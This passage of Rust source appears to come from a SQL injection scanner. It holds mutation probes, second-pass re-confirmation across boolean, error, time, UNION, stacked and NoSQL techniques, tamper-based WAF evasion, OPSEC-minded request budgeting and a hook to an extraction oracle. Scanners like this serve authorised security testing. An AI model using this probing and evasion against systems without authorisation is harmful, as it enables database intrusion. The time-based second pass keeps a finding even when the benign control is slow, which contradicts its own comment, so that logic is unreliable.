        _ => RequestClass::Default,
    };
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let mut rng = crate::seeded_rng::make_rng(seed);
    let mut sent = 0usize;
    // Échec silencieux : chaque variante est tracée, jamais touchée aux
    // findings ; le résultat ne crée ni ne supprime rien.
    for variant in variants.iter().take(
        crate::mutation::MAX_MUTATION_REQUESTS_PER_FINDING
            .min(crate::mutation::MAX_MUTATION_VARIANTS),
    ) {
        if cancel.is_cancelled() {
            break;
        }
        let final_payload =
            build_final_payload_with_rng(&variant.payload, tampers_for_variant, popts, &mut rng);
        let (raw_body, ms, status) = fetch_for_payload_with_class(
            client,
            state,
            cancel,
            target,
            target_str,
            param,
            &final_payload,
            marker_set,
            raw,
            opts,
            popts,
            class,
        )
        .await;
        if cancel.is_cancelled() || status == 0 {
            continue;
        }
        sent = sent.saturating_add(1);
        let body = matcher.pre_process(&raw_body);
        let diff = mutation_diff_signal(finding, baseline, &baseline_body, &body, ms, status);
        push_confirm_trace(
            state,
            &param.key(),
            finding.technique,
            &variant.plan_label,
            seed,
            &final_payload,
            &body,
            diff,
            ms,
        )
        .await;
        debug!(
            param = %finding.parameter,
            technique = %finding.technique,
            plan = %variant.plan_label,
            diff,
            status,
            "mutation probe traced (silent, finding kept)"
        );
    }
    if sent > 0 {
        info!(
            param = %finding.parameter,
            technique = %finding.technique,
            sent,
            "mutation second-pass traced (finding kept regardless)"
        );
    }
    sent
}

/// Signal `diff` informatif pour une sonde mutée (traçabilité uniquement).
///
/// Borné `[0.0, 1.0]`, jamais utilisé pour créer/supprimer un finding :
/// la mutation est une preuve d'évasion citée, pas un verdict.
fn mutation_diff_signal(
    finding: &Finding,
    baseline: &baseline::Baseline,
    baseline_body: &str,
    body: &str,
    ms: f64,
    _status: u16,
) -> f64 {
    match finding.technique {
        TechniqueKind::Boolean | TechniqueKind::Json | TechniqueKind::Nosql => {
            crate::detection::response_diff::adaptive_similarity(baseline_body, body)
                .clamp(0.0, 1.0)
        }
        TechniqueKind::Error => {
            let r = crate::techniques::error::detector::ErrorDetector::new().evaluate_with_context(
                baseline_body,
                body,
                body,
            );
            if r.is_vulnerable { 0.9 } else { 0.1 }
        }
        TechniqueKind::Time => {
            let detector = crate::techniques::time::detector::TimeDetector::from_baseline(baseline);
            if ms > detector.threshold() { 0.9 } else { 0.1 }
        }
        TechniqueKind::Union => {
            let detector = crate::techniques::union::detector::UnionDetector::new();
            let marker = union_marker_for_finding(finding);
            let r = detector.evaluate(baseline_body, body, baseline.mean_ms, ms, 3, &marker);
            if r.is_vulnerable { 0.85 } else { 0.1 }
        }
        TechniqueKind::Stacked => {
            if body.contains("injekt") || body != baseline_body {
                0.8
            } else {
                0.1
            }
        }
        TechniqueKind::Oob => 0.0,
    }
}

/// Marqueur UNION pour le signal muté : réutilise le premier core DBMS-aware
/// quand il existe, sinon le marqueur générique `injekt`.
fn union_marker_for_finding(finding: &Finding) -> String {
    let label = dbms_label_from_finding(finding);
    crate::techniques::union::payloads::union_payloads_for(label, 3)
        .first()
        .map_or_else(|| "injekt".to_owned(), |p| p.marker.clone())
}

/// Dispatch `--confirm` re-validation per technique (OOB excluded by the
/// caller). Each branch sends fresh payloads built with the derived seed RNG
/// and records hashes-only trace entries. Returns `true` when the differential
/// still holds (keep), `false` when it clearly disappeared (drop).
/// Inconclusive (transport error, `--ignore-code`, cancel) returns `true`
/// (keep): the first pass stays authoritative, the second pass only vetoes on
/// positive evidence of absence — never invents findings.
///
/// Robustness (C5-tardif fix): every branch retries a bounded set of fresh
/// payloads (mirroring the first-pass `payload_budget`, capped) instead of a
/// single `.first()`. The first-pass may have confirmed on the 2nd L1 payload
/// (e.g. `' OR 1=1` after a polyglot miss, or a numeric pair after
/// quote-ordering); re-validating only the head polyglot would drop a true
/// positive on conclusive-but-wrong-family evidence. Keep iff ANY candidate
/// re-confirms; drop only when ALL candidates conclusively fail.
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn confirm_finding_second_pass(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    finding: &Finding,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    baseline: &baseline::Baseline,
    effective_tampers: &[Tamper],
    mutation_plan: &str,
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    ignore_codes: &[u16],
    seed: Option<u64>,
    context: &InjectionContext,
    level: u8,
) -> bool {
    match finding.technique {
        TechniqueKind::Boolean | TechniqueKind::Json | TechniqueKind::Nosql => {
            confirm_boolean_second_pass(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                finding,
                marker_set,
                raw,
                baseline,
                effective_tampers,
                mutation_plan,
                opts,
                popts,
                matcher,
                ignore_codes,
                seed,
                context,
                level,
            )
            .await
        }
        TechniqueKind::Error => {
            confirm_error_second_pass(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                finding,
                marker_set,
                raw,
                baseline,
                effective_tampers,
                mutation_plan,
                opts,
                popts,
                matcher,
                ignore_codes,
                seed,
                context,
                level,
            )
            .await
        }
        TechniqueKind::Time => {
            confirm_time_second_pass(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                finding,
                marker_set,
                raw,
                baseline,
                effective_tampers,
                mutation_plan,
                opts,
                popts,
                matcher,
                ignore_codes,
                seed,
                level,
            )
            .await
        }
        TechniqueKind::Union => {
            confirm_union_second_pass(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                finding,
                marker_set,
                raw,
                baseline,
                effective_tampers,
                mutation_plan,
                opts,
                popts,
                matcher,
                ignore_codes,
                seed,
                level,
            )
            .await
        }
        TechniqueKind::Stacked => {
            confirm_stacked_second_pass(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                finding,
                marker_set,
                raw,
                baseline,
                effective_tampers,
                mutation_plan,
                opts,
                popts,
                matcher,
                ignore_codes,
                seed,
                level,
            )
            .await
        }
        TechniqueKind::Oob => true,
    }
}

/// Boolean/Json second-pass: fresh TRUE/FALSE pairs (derived seed), same bar
/// as first-pass single trial (`is_vulnerable && confidence > 0.6`).
///
/// Bounded retry (C5-tardif fix): tries up to `payload_budget(level, 2, len)`
/// candidates (capped at 3 pairs = 6 requests), quote-ordered exactly like
/// first-pass detection. Keep iff ANY pair re-confirms; drop only when ALL
/// pairs conclusively fail. Inconclusive (transport/`--ignore-code`/cancel)
/// keeps immediately without trying further pairs.
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn confirm_boolean_second_pass(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    finding: &Finding,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    baseline: &baseline::Baseline,
    effective_tampers: &[Tamper],
    mutation_plan: &str,
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    ignore_codes: &[u16],
    seed: Option<u64>,
    context: &InjectionContext,
    level: u8,
) -> bool {
    let mut rng = crate::seeded_rng::make_rng(seed);
    let label = dbms_label_from_finding(finding);
    // Candidate TRUE/FALSE bases in first-pass order (quote-aware for
    // boolean; JSON/NoSQL keep catalogue order — no quote-ordering there).
    let candidates: Vec<(String, String)> = if finding.technique == TechniqueKind::Json {
        let payloads = crate::techniques::json::payloads::json_payloads_for(label);
        let take = payload_budget(level, 2, payloads.len()).clamp(1, 3);
        payloads
            .iter()
            .take(take)
            .map(|p| (p.true_payload.clone(), p.false_payload.clone()))
            .collect()
    } else if finding.technique == TechniqueKind::Nosql {
        let payloads = crate::techniques::nosql::payloads::nosql_payloads();
        let take = payload_budget(level, 2, payloads.len()).clamp(1, 3);
        payloads
            .iter()
            .take(take)
            .map(|p| (p.true_payload.clone(), p.false_payload.clone()))
            .collect()
    } else {
        let mut payloads = crate::techniques::boolean::payloads::boolean_payloads_for(label);
        order_boolean_by_context(&mut payloads, context);
        let take = payload_budget(level, 2, payloads.len()).clamp(1, 3);
        payloads
            .iter()
            .take(take)
            .map(|p| (p.true_payload.clone(), p.false_payload.clone()))
            .collect()
    };
    if candidates.is_empty() {
        return true;
    }
    // Boolean-safe only: opaque tampers would collapse the differential.
    let safe: Vec<Tamper> = effective_tampers
        .iter()
        .filter(|t| t.is_boolean_safe())
        .cloned()
        .collect();
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    for (true_base, false_base) in &candidates {
        if cancel.is_cancelled() {
            return true;
        }
        let true_payload = build_final_payload_with_rng(true_base, &safe, popts, &mut rng);
        let false_payload = build_final_payload_with_rng(false_base, &safe, popts, &mut rng);
        let (true_raw, true_ms, true_status) = fetch_for_payload_with_class(
            client,
            state,
            cancel,
            target,
            target_str,
            param,
            &true_payload,
            marker_set,
            raw,
            opts,
            popts,
            RequestClass::Boolean,
        )
        .await;
        let (false_raw, false_ms, false_status) = fetch_for_payload_with_class(
            client,
            state,
            cancel,
            target,
            target_str,
            param,
            &false_payload,
            marker_set,
            raw,
            opts,
            popts,
            RequestClass::Boolean,
        )
        .await;
        if cancel.is_cancelled() || true_status == 0 || false_status == 0 {
            return true;
        }
        if is_ignored(true_status, ignore_codes) || is_ignored(false_status, ignore_codes) {
            return true;
        }
        let true_body = matcher.pre_process(&true_raw);
        let false_body = matcher.pre_process(&false_raw);
        let res = if finding.technique == TechniqueKind::Json {
            crate::techniques::json::detector::JsonDetector::new().evaluate_boolean(
                &baseline_body,
                &true_body,
                &false_body,
                baseline.mean_ms,
                true_ms,
                false_ms,
            )
        } else if finding.technique == TechniqueKind::Nosql {
            crate::techniques::nosql::detector::NosqlDetector::new().evaluate_boolean(
                &baseline_body,
                &true_body,
                &false_body,
                baseline.mean_ms,
                true_ms,
                false_ms,
            )
        } else {
            crate::techniques::boolean::detector::BooleanDetector::new().evaluate(
                &baseline_body,
                &true_body,
                &false_body,
                baseline.mean_ms,
                true_ms,
                false_ms,
            )
        };
        push_confirm_trace(
            state,
            &param.key(),
            finding.technique,
            mutation_plan,
            seed,
            &true_payload,
            &true_body,
            res.true_similarity,
            true_ms,
        )
        .await;
        push_confirm_trace(
            state,
            &param.key(),
            finding.technique,
            mutation_plan,
            seed,
            &false_payload,
            &false_body,
            res.false_similarity,
            false_ms,
        )
        .await;
        if matcher.gate_boolean(&true_body, &false_body, true_status, false_status) == Some(false) {
            continue;
        }
        if res.is_vulnerable && res.confidence > 0.6 {
            return true;
        }
    }
    false
}

/// Error second-pass: re-send DBMS-aware error payloads (bounded retry);
/// the DB error pattern must still appear (baseline-vetoed). Fragment findings
/// (`extracted=yes`) keep the bar; `bool_confirm=true` findings additionally
/// require the boolean pair to still hold (via [`confirm_boolean_second_pass`]).
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn confirm_error_second_pass(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    finding: &Finding,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    baseline: &baseline::Baseline,
    effective_tampers: &[Tamper],
    mutation_plan: &str,
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    ignore_codes: &[u16],
    seed: Option<u64>,
    context: &InjectionContext,
    level: u8,
) -> bool {
    let mut rng = crate::seeded_rng::make_rng(seed);
    let payloads =
        crate::techniques::error::payloads::error_payloads_for(dbms_label_from_finding(finding));
    let take = payload_budget(level, 2, payloads.len()).clamp(1, 2);
    if payloads.is_empty() {
        return true;
    }
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    for p in payloads.iter().take(take) {
        if cancel.is_cancelled() {
            return true;
        }
        // Single chain (not expanded): ~2x bound, coherent with detection tamper.
        let tampered = build_final_payload_with_rng(&p.payload, effective_tampers, popts, &mut rng);
        let (raw_body, ms, status) = fetch_for_payload(
            client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
            popts,
        )
        .await;
        if cancel.is_cancelled() || status == 0 || is_ignored(status, ignore_codes) {
            return true;
        }
        let body = matcher.pre_process(&raw_body);
        let r = crate::techniques::error::detector::ErrorDetector::new().evaluate_with_context(
            &baseline_body,
            &body,
            &tampered,
        );
        push_confirm_trace(
            state,
            &param.key(),
            finding.technique,
            mutation_plan,
            seed,
            &tampered,
            &body,
            if r.is_vulnerable { 0.9 } else { 0.1 },
            ms,
        )
        .await;
        if matcher.matches(&body, status) == Some(false) {
            continue;
        }
        if !r.is_vulnerable {
            continue;
        }
        // `bool_confirm=true` findings must still hold the boolean differential.
        if finding.evidence.contains("bool_confirm=true") {
            let ok = confirm_boolean_second_pass(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                finding,
                marker_set,
                raw,
                baseline,
                effective_tampers,
                mutation_plan,
                opts,
                popts,
                matcher,
                ignore_codes,
                seed,
                context,
                level,
            )
            .await;
            if !ok {
                continue;
            }
        }
        return true;
    }
    false
}

/// Time second-pass: fresh sleep probes + benign control (bounded retry).
/// Keep iff ANY sleep candidate still shows the delay while the control stays
/// fast. Inconclusive (transport/`--ignore-code`/cancel/jitter-dominated
/// baseline) keeps immediately.
#[allow(clippy::too_many_arguments)]
async fn confirm_time_second_pass(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    finding: &Finding,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    baseline: &baseline::Baseline,
    effective_tampers: &[Tamper],
    mutation_plan: &str,
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    ignore_codes: &[u16],
    seed: Option<u64>,
    level: u8,
) -> bool {
    let mut rng = crate::seeded_rng::make_rng(seed);
    let label = dbms_label_from_finding(finding);
    let candidates = crate::techniques::time::payloads::time_payloads_for(label, 3);
    let take = payload_budget(level, 2, candidates.len()).clamp(1, 2);
    if candidates.is_empty() {
        return true;
    }
    let detector = crate::techniques::time::detector::TimeDetector::from_baseline(baseline);
    for base in candidates.iter().take(take) {
        if cancel.is_cancelled() {
            return true;
        }
        #[allow(clippy::cast_precision_loss)]
        let sleep_ms = base.sleep_secs as f64 * 1000.0;
        if baseline.stddev_ms > sleep_ms * 0.5 {
            return true;
        }
        let payload_str =
            build_final_payload_with_rng(&base.payload, effective_tampers, popts, &mut rng);
        let (raw_body, ms, status) = fetch_for_payload_with_class(
            client,
            state,
            cancel,
            target,
            target_str,
            param,
            &payload_str,
            marker_set,
            raw,
            opts,
            popts,
            RequestClass::Time,
        )
        .await;
        if cancel.is_cancelled() || status == 0 || is_ignored(status, ignore_codes) {
            return true;
        }
        let body = matcher.pre_process(&raw_body);
        push_confirm_trace(
            state,
            &param.key(),
            finding.technique,
            mutation_plan,
            seed,
            &payload_str,
            &body,
            if ms > detector.threshold() { 0.9 } else { 0.1 },
            ms,
        )
        .await;
        if matcher.matches(&body, status) == Some(false) {
            continue;
        }
        #[allow(clippy::cast_precision_loss)]
        let first = detector.evaluate(ms, base.sleep_secs as f64);
        if !first.is_vulnerable {
            continue;
        }
        let control_payload = param.original_value.clone();
        let (_control_body, control_ms, control_status) = fetch_for_payload_with_class(
            client,
            state,
            cancel,
            target,
            target_str,
            param,
            &control_payload,
            marker_set,
            raw,
            opts,
            popts,
            RequestClass::Time,
        )
        .await;
        if control_status == 0 || cancel.is_cancelled() {
            return true;
        }
        if control_ms > detector.threshold() {
            return true;
        }
        return true;
    }
    false
}

/// Union second-pass: re-send fresh UNION cores for the finding's DBMS
/// (bounded retry across the finding's column width and its neighbour);
/// the marker differential must still hold for ANY candidate.
#[allow(clippy::too_many_arguments)]
async fn confirm_union_second_pass(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    finding: &Finding,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    baseline: &baseline::Baseline,
    effective_tampers: &[Tamper],
    mutation_plan: &str,
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    ignore_codes: &[u16],
    seed: Option<u64>,
    level: u8,
) -> bool {
    let mut rng = crate::seeded_rng::make_rng(seed);
    let label = dbms_label_from_finding(finding);
    // Column widths to retry: the finding's own width first (parsed from
    // evidence `columns=N`), then the historical default 3. Bounded to 2
    // widths × 1 payload each (mirrors the per-cols `payload_budget`).
    let mut widths: Vec<usize> = Vec::with_capacity(2);
    if let Some(w) = parse_union_columns(&finding.evidence) {
        widths.push(w);
    }
    if !widths.contains(&3) {
        widths.push(3);
    }
    let take_widths = payload_budget(level, 1, widths.len()).clamp(1, 2);
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let detector = crate::techniques::union::detector::UnionDetector::new();
    for cols in widths.into_iter().take(take_widths) {
        if cancel.is_cancelled() {
            return true;
        }
        let payloads = crate::techniques::union::payloads::union_payloads_for(label, cols);
        let Some(p) = payloads.first() else {
            continue;
        };
        let tampered = build_final_payload_with_rng(&p.payload, effective_tampers, popts, &mut rng);
        let (raw_body, ms, status) = fetch_for_payload(
            client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
            popts,
        )
        .await;
        if cancel.is_cancelled() || status == 0 || is_ignored(status, ignore_codes) {
            return true;
        }
        let body = matcher.pre_process(&raw_body);
        let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, cols, &p.marker);
        push_confirm_trace(
            state,
            &param.key(),
            finding.technique,
            mutation_plan,
            seed,
            &tampered,
            &body,
            if r.is_vulnerable { 0.85 } else { 0.1 },
            ms,
        )
        .await;
        if matcher.matches(&body, status) == Some(false) {
            continue;
        }
        if r.is_vulnerable {
            return true;
        }
    }
    false
}

/// Stacked second-pass: re-send fresh stacked cores (bounded retry); the
/// marker must still execute for ANY candidate.
#[allow(clippy::too_many_arguments)]
async fn confirm_stacked_second_pass(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    finding: &Finding,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    baseline: &baseline::Baseline,
    effective_tampers: &[Tamper],
    mutation_plan: &str,
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    ignore_codes: &[u16],
    seed: Option<u64>,
    level: u8,
) -> bool {
    let mut rng = crate::seeded_rng::make_rng(seed);
    let payloads = crate::techniques::stacked::payloads::stacked_payloads_for(
        dbms_label_from_finding(finding),
    );
    let take = payload_budget(level, 2, payloads.len()).clamp(1, 2);
    if payloads.is_empty() {
        return true;
    }
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let detector = crate::techniques::stacked::detector::StackedDetector::new();
    for p in payloads.iter().take(take) {
        if cancel.is_cancelled() {
            return true;
        }
        let tampered = build_final_payload_with_rng(&p.payload, effective_tampers, popts, &mut rng);
        let (raw_body, ms, status) = fetch_for_payload(
            client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
            popts,
        )
        .await;
        if cancel.is_cancelled() || status == 0 || is_ignored(status, ignore_codes) {
            return true;
        }
        let body = matcher.pre_process(&raw_body);
        let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms, p, &tampered);
        push_confirm_trace(
            state,
            &param.key(),
            finding.technique,
            mutation_plan,
            seed,
            &tampered,
            &body,
            if r.is_vulnerable { 0.8 } else { 0.1 },
            ms,
        )
        .await;
        if matcher.matches(&body, status) == Some(false) {
            continue;
        }
        if r.is_vulnerable {
            return true;
        }
    }
    false
}

#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn test_error_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
    boolean_enabled: bool,
    seed: Option<u64>,
    context: &InjectionContext,
    dbms_belief: &DbmsBelief,
) {
    use crate::techniques::error::detector::is_payload_reflected;

    let (top_dbms, top_prob) = dbms_belief.top_candidate();
    debug!(param = param.key(), context = context.summary(), %top_dbms, top_prob, "error: context-aware detection");
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    let detector = ErrorDetector::new();
    // DBMS-aware error payloads once the belief is actionable (>= 0.85);
    // otherwise generic polyglots (unchanged default).
    let payloads =
        crate::techniques::error::payloads::error_payloads_for(dbms_payload_label(dbms_belief));
    let tamper_sets = tamper_transformation_sets(tampers);
    // Baseline evaluated once per parameter: vetoes footer/banner FPs
    // (e.g. verbose `MySQL 5.7` footer already present without injection).
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let baseline_len = baseline_body.len();
    for p in payloads
        .iter()
        .take(payload_budget(level, 2, payloads.len()))
    {
        if cancel.is_cancelled() {
            break;
        }
        let mut found = false;
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                break;
            }
            let tampered = build_final_payload_with_rng(&p.payload, trans, popts, &mut rng);
            let (raw_body, _ms, status) = fetch_for_payload(
                client, state, cancel, target, target_str, param, &tampered, marker_set, raw, opts,
                popts,
            )
            .await;
            // Transport/body errors surface as status 0 + `""`: never scored
            // (empty body would otherwise be a dissimilar-body FP elsewhere,
            // and an error pattern can never match it anyway — skip fast).
            if status == 0 {
                continue;
            }
            let body = matcher.pre_process(&raw_body);
            // `--ignore-code`: an ignored status is skipped, never a finding.
            if is_ignored(status, ignore_codes) {
                continue;
            }
            // Context-aware gate: baseline veto + reflected-payload masking.
            // Kills the noxtools FP shape where `EXTRACTVALUE` is merely
            // echoed in `value="...payload..."` with no DB error.
            let r = detector.evaluate_with_context(&baseline_body, &body, &tampered);
            if r.is_vulnerable {
                // Matcher veto gate: `Some(false)` rejects the candidate.
                if matcher.matches(&body, status) == Some(false) {
                    continue;
                }
                let tamper_label = if trans.is_empty() {
                    "none".to_owned()
                } else {
                    trans
                        .iter()
                        .map(super::super::techniques::tamper::Tamper::name)
                        .collect::<Vec<_>>()
                        .join(",")
                };
                let reflected = is_payload_reflected(&body, &tampered);
                let extracted_flag = if r.extracted.is_some() { "yes" } else { "no" };
                // Confirmation policy: a hit WITH an extracted fragment (0.9)
                // is self-sufficient — push direct with no extra requests.
                // A hit WITHOUT fragment (0.75) gets one boolean TRUE/FALSE
                // pair (+2 req): confirmed upgrades to 0.9, otherwise the
                // finding is kept degraded at 0.55 `unconfirmed` and barred
                // from the heavy extraction oracle (see
                // `is_extraction_eligible`).
                let (confidence, bool_confirm, true_sim, false_sim, unconfirmed) =
                    if r.extracted.is_some() {
                        (
                            r.confidence,
                            "skipped(fragment)".to_owned(),
                            0.0,
                            0.0,
                            false,
                        )
                    } else {
                        let outcome = confirm_error_with_boolean(
                            client,
                            state,
                            cancel,
                            target,
                            target_str,
                            param,
                            baseline,
                            &baseline_body,
                            marker_set,
                            raw,
                            trans,
                            opts,
                            popts,
                            matcher,
                            ignore_codes,
                            boolean_enabled,
                            seed,
                        )
                        .await;
                        match outcome.verdict {
                            ErrorBoolConfirm::Confirmed => (
                                0.9,
                                ErrorBoolConfirm::Confirmed.as_str().to_owned(),
                                outcome.true_sim,
                                outcome.false_sim,
                                false,
                            ),
                            ErrorBoolConfirm::Denied
                            | ErrorBoolConfirm::Inconclusive
                            | ErrorBoolConfirm::Skipped => (
                                0.55,
                                format!("{} unconfirmed", outcome.verdict.as_str()),
                                outcome.true_sim,
                                outcome.false_sim,
                                true,
                            ),
                        }
                    };
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Error,
                    if baseline.is_waf_blocking() {
                        // A blocking WAF (challenge/deny/rate-limit) silently
                        // filters long payloads: doubt the pattern (0.9→0.6)
                        // instead of trusting it blindly (noxtools lesson).
                        crate::detection::waf::downgrade_for_waf(confidence)
                    } else {
                        confidence
                    },
                    format!(
                        "error pattern {:?} tamper={} baseline_len={} injected_len={} reflected={} extracted={} bool_confirm={} true_sim={:.2} false_sim={:.2}{}{}{}{}{}",
                        r.matched_pattern,
                        tamper_label,
                        baseline_len,
                        body.len(),
                        reflected,
                        extracted_flag,
                        bool_confirm,
                        true_sim,
                        false_sim,
                        if unconfirmed { " unconfirmed" } else { "" },
                        baseline.waf_evidence_suffix(),
                        opts.evidence_suffix(),
                        popts.evidence_suffix(),
                        matcher.evidence_suffix()
                    ),
                )
                .with_waf(baseline.waf_vendor.clone(), baseline.is_waf_blocking());
                finding.dbms = Some(p.dbms.clone());
                state.write().await.push_finding(finding);
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
}

#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn test_time_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
    seed: Option<u64>,
    context: &InjectionContext,
    dbms_belief: &DbmsBelief,
) {
    let (top_dbms, top_prob) = dbms_belief.top_candidate();
    debug!(param = param.key(), context = context.summary(), %top_dbms, top_prob, "time: context-aware detection");
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    // Blind sweep: L1 tries the first 4 legacy payloads, L2 doubles to 8,
    // L3+ exhausts all 16 (5 legacies + conditional/alternate/heavy variants).
    // Threshold reuses the baseline calibration (`from_baseline`); a
    // positive first shot is confirmed by an immediate second shot
    // (`evaluate_confirmed`) so a single jitter spike never reports.
    // OPSEC: the extra request fires only on a positive first shot —
    // clean targets cost the same as before. Jitter/rate-limiting are
    // preserved via `fetch_for_payload`; outer `buffer_unordered`
    // concurrency is untouched.
    let detector = TimeDetector::from_baseline(baseline);
    // DBMS-aware blind sweep: a confident belief (>= 0.85) tries only that
    // engine's sleep family; otherwise the 5-legacies-first blind sweep.
    let candidates = dbms_payload_label(dbms_belief).map_or_else(
        || all_time_payloads(3),
        |label| crate::techniques::time::payloads::time_payloads_for(Some(label), 3),
    );
    let budget = payload_budget(level, 4, candidates.len());
    let sets = tamper_transformation_sets(tampers);
    for base in candidates.iter().take(budget) {
        if cancel.is_cancelled() {
            break;
        }
        // Jitter guard: when the baseline spread already dominates the sleep
        // signal, any delay measurement is noise — skip instead of reporting
        // network chaos as Oracle time-based SQLi.
        #[allow(clippy::cast_precision_loss)]
        let sleep_ms = base.sleep_secs as f64 * 1000.0;
        if baseline.stddev_ms > sleep_ms * 0.5 {
            tracing::debug!(
                param = param.key(),
                stddev_ms = baseline.stddev_ms,
                sleep_ms,
                "time probe skipped: baseline jitter dominates the sleep signal"
            );
            continue;
        }
        let mut confirmed = false;
        for trans in &sets {
            if cancel.is_cancelled() {
                break;
            }
            let payload_str = build_final_payload_with_rng(&base.payload, trans, popts, &mut rng);
            let (raw_body, ms, status) = fetch_for_payload_with_class(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                &payload_str,
                marker_set,
                raw,
                opts,
                popts,
                RequestClass::Time,
            )
            .await;
            // `--ignore-code`: an ignored status is skipped, never a finding.
            if is_ignored(status, ignore_codes) {
                continue;
            }
            let body = matcher.pre_process(&raw_body);
            // sleep_secs is a small time-based delay (seconds); cast is always lossless.
            #[allow(clippy::cast_precision_loss)]
            let first = detector.evaluate(ms, base.sleep_secs as f64);
            if !first.is_vulnerable {
                continue;
            }
            // Matcher veto before spending the confirmation shot.
            if matcher.matches(&body, status) == Some(false) {
                continue;
            }
            if cancel.is_cancelled() {
                break;
            }
            let (raw_body2, ms2, status2) = fetch_for_payload_with_class(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                &payload_str,
                marker_set,
                raw,
                opts,
                popts,
                RequestClass::Time,
            )
            .await;
            if is_ignored(status2, ignore_codes) {
                continue;
            }
            let body2 = matcher.pre_process(&raw_body2);
            if matcher.matches(&body2, status2) == Some(false) {
                continue;
            }
            #[allow(clippy::cast_precision_loss)]
            let r = detector.evaluate_confirmed(ms, ms2, base.sleep_secs as f64);
            if r.is_vulnerable {
                // Differential control: re-send the benign (original) value.
                // A slow backend (cold cache, throttle, degraded host) is slow
                // for ANY input — both sleep shots clear the bar for non-SQL
                // reasons. The control must stay fast, otherwise reject.
                // OPSEC: fires only after a double-positive, never on clean
                // targets.
                if cancel.is_cancelled() {
                    break;
                }
                let control_payload = param.original_value.clone();
                let (_control_body, control_ms, control_status) = fetch_for_payload_with_class(
                    client,
                    state,
                    cancel,
                    target,
                    target_str,
                    param,
                    &control_payload,
                    marker_set,
                    raw,
                    opts,
                    popts,
                    RequestClass::Time,
                )
                .await;
                if control_status == 0 {
                    // Transport error on the control: timing untrustworthy.
                    continue;
                }
                if control_ms > detector.threshold() {
                    tracing::debug!(
                        param = param.key(),
                        control_ms,
                        threshold_ms = detector.threshold(),
                        "time finding rejected: benign control equally slow (degraded endpoint?)"
                    );
                    continue;
                }
                let tamper_label = if trans.is_empty() {
                    "none".to_owned()
                } else {
                    trans
                        .iter()
